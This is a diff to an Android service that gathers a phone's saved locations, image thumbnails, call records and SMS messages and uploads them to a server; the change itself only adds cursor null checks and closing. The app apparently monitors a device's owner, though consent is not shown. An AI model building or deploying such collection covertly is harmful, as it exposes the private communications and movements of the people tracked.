@@ -66,12 +66,14 @@ public class PacketSenderService extends Service {
 		 * Sends new locations to the server.
 		 */
 		private void sendNewLocations() {
+			Cursor c = null;
 			try {
 				ContentResolver cr = getContentResolver();
 
 				// Return all the saved locations
-				Cursor c = cr.query(ActivityContract.Locations.CONTENT_URI, null, null, null, null);
-
+				c = cr.query(ActivityContract.Locations.CONTENT_URI, null, null, null, null);
+				if (c == null)
+					return;
 				while (c.moveToNext()) {
 					int id = c.getInt(ActivityContract.Locations._ID_COLUMN);
 					double latitude = c.getDouble(ActivityContract.Locations.LATITUDE_COLUMN);
@@ -95,26 +97,35 @@ public class PacketSenderService extends Service {
 			} catch (IOException e) {
 				e.printStackTrace();
 			}
+			finally{
+				if (c != null)
+					c.close();
+			}
 		}
 
 		/**
 		 * Sends new thumbnails to the server.
 		 */
 		private void sendNewThumbnails() {
+			Cursor c = null;
 			try {
 				ContentResolver cr = getContentResolver();
 
 				// Return new saved images
 				String where = Thumbnails.DELETED + " = 0 AND " + Thumbnails.THUMBNAIL_SENT + " = 0 AND "
 						+ Thumbnails.FULL_IMAGE_SENT + " = 0";
-				Cursor c = cr.query(ActivityContract.Thumbnails.CONTENT_URI, new String[] { Thumbnails.MEDIASTORE_ID,
+				c = cr.query(ActivityContract.Thumbnails.CONTENT_URI, new String[] { Thumbnails.MEDIASTORE_ID,
 						Thumbnails._ID }, where, null, null);
+				if (c == null)
+					return;
 				while (c.moveToNext()) {
 					int storeId = c.getInt(0); // save store_id;
 					Cursor imageInfoCursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, new String[] {
 							MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATA,
 							MediaStore.Images.Media.DATE_ADDED }, "_id = ?", new String[] { String.valueOf(storeId) },
 							null);
+					if (imageInfoCursor == null)
+						continue;
 					imageInfoCursor.moveToFirst();
 					if (imageInfoCursor.getCount() == 0) { // file is not found
 						ContentValues value = new ContentValues();
@@ -150,10 +161,15 @@ public class PacketSenderService extends Service {
 									new String[] { String.valueOf(c.getInt(1)) });
 						}
 					}
+					imageInfoCursor.close();
 				}
 
 			} catch (IOException e) {
 				e.printStackTrace();
+			}
+			finally{
+				if (c != null)
+					c.close();
 			}
 		}
 
@@ -161,12 +177,14 @@ public class PacketSenderService extends Service {
 		 * Sends new calls to the server.
 		 */
 		private void sendNewCalls() {
+			Cursor c = null;
 			try {
 				ContentResolver cr = getContentResolver();
 
 				// Return all the saved calls
-				Cursor c = cr.query(ActivityContract.Calls.CONTENT_URI, null, null, null, null);
-
+				c = cr.query(ActivityContract.Calls.CONTENT_URI, null, null, null, null);
+				if (c == null)
+					return;
 				while (c.moveToNext()) {
 					int id = c.getInt(ActivityContract.Calls._ID_COLUMN);
 					String caller = c.getString(ActivityContract.Calls.CALLER_COLUMN);
@@ -189,18 +207,24 @@ public class PacketSenderService extends Service {
 			} catch (IOException e) {
 				e.printStackTrace();
 			}
+			finally{
+				if (c != null)
+					c.close();
+			}
 		}
 
 		/**
 		 * Sends new SMSes to the server.
 		 */
 		private void sendNewSMS() {
+			Cursor c = null;
 			try {
 				ContentResolver cr = getContentResolver();
 
 				// Return all the saved SMS
-				Cursor c = cr.query(ActivityContract.SMS.CONTENT_URI, null, null, null, null);
-
+				c = cr.query(ActivityContract.SMS.CONTENT_URI, null, null, null, null);
+				if (c == null)
+					return;
 				while (c.moveToNext()) {
 					int id = c.getInt(ActivityContract.SMS._ID_COLUMN);
 					String sender = c.getString(ActivityContract.SMS.SENDER_COLUMN);
@@ -223,6 +247,10 @@ public class PacketSenderService extends Service {
 
 			} catch (IOException e) {
 				e.printStackTrace();
+			}
+			finally{
+				if (c != null)
+					c.close();
 			}
 		}
 
